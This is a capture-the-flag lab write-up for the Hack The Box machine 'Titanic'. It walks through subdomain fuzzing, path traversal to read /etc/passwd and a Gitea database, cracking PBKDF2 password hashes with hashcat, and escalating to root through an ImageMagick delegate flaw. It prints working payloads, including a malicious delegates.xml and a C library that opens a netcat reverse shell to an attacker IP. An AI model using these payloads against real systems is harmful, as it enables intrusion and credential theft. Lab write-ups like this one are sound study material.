---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Titanic
linux machine

## Foothold

Update etc hosts.

```bash
nmap -sV -v titanic.htb
```

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.titanic.htb" -u http://titanic.htb -fs 0-340
```
we find a dev subdomain

Update etc hosts

access dev.titanic.htb

## User

register

look around 

http://dev.titanic.htb/explore/repos

look around

in the http://dev.titanic.htb/developer/flask-app/src/branch/main/app.py we can see that there is a path raversal in the download 

```
titanic.htb/download?ticket=../../../../../../etc/passwd
```

```
http://titanic.htb/download?ticket=../../../../../../home/developer/user.txt
```

check gitea docs to see that sqlite is the default db, check the default config in github

```
http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/conf/app.ini
```

download db

```
http://titanic.htb/download?ticket=../../../../../../../home/developer/gitea/data/gitea/gitea.db
```

check the users table

how to crack the password https://www.cyberly.org/en/how-do-you-use-hashcat-to-crack-pbkdf2-hashes/index.html

1. get hashes (kali has sqlitebrowser, or sqlite cli client)
```
sqlite> select name,passwd,salt from user;
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34
```
2. reformat to use `,` as separator
```
─$ cat hashes_salt         
administrator,cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136,2d149e5fbd1b20cf31db3e3c6a28fc9b
developer,e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56,8bf3e3452b78544f8bee9400d6936d34
tom,ad0038fd7668bacd6959b51d409537efdeed8453c8d328d31a2e44acf85482193e6aea6881cf9f35bb6993097f3f825d694d,6dcf54942d1b1ca92358df3db95b4743
luks,8084892a07edb03fa35b27450af7eabd510b1a46d1327b6f17c957db7d03453f86fe167419d90f11150a97424f51f0b4ce80,a47bf285bd35995444a40f17c0b38334
test,769d2dce6997c88fbd23deb7708cafba3e63387181d57c1e06128a7b7e26eaba832a6bb06befcb1c340761261fcc302f93a9,309262866687151ffdedbbbfb8cb915c
```

3. Crack hash
Or you can follow this code: https://gist.github.com/h4rithd/0c5da36a0274904cafb84871cf14e271
You can use the code, or query the DB directly
```
sqlite> SELECT name,passwd_hash_algo,salt,passwd FROM user;
administrator|pbkdf2$50000$50|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer|pbkdf2$50000$50|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
razzmann|pbkdf2$50000$50|24fe329330234d88bc40d35c009a3ecd|134f5b83097b97cd310f2068a099a3e13f03a64d642402f58fd9afb2789cc7270be51492f97d83d80d7302bab177c9443fde
```
The point is, you need to format the hash so hashcat can process it.
```
sha256:<ITERATIONS>:<BASE64_SALT>:<BASE64_PASS>
```
Be aware that the salt and password in the database are in HEX. So you need to convert it from hex and then to base64. (cyberchef)
With that you create hash for hashcat
```
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```
now just run
```
hashcat hash /usr/share/wordlists/rockyou.txt
```
and collect your password

with that you can SSH in
```
sshpass -p '25282528' ssh developer@titanic.htb -o StrictHostKeychecking=no
```

## Root

listing processes that are running under a diffferent user:
https://github.com/DominicBreuker/pspy

run linpeas or pspy

interesting thing is a script `/opt/scripts/identify_images.sh`
it takes a list of files from a directory we can write to. The second nice thing is that it's a vulnerable version https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

We will create two files. One will be delegates.xml that will exploit the magick tool:

```
<delegatemap><delegate xmlns="" decode="XML" command="cat /root/root.txt > /tmp/root.txt"/></delegatemap>
```

and the other will be `delegates.xml\ .jpg`. This way the xargs will export `delegates.xml` and `.jpg` . The file can be empty.

Instead of reading the flag file, you can add a public key to authorized_keys and login to the root account.

OR

1. listener on our kali:
```
nc -lvnp 9001
```

2. create lib in /opt/app/static/assets/images. Change to your address. This reshell was inspired by revshells.com:
```
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.3 9001 >/tmp/f");
    exit(0);
}
EOF
```
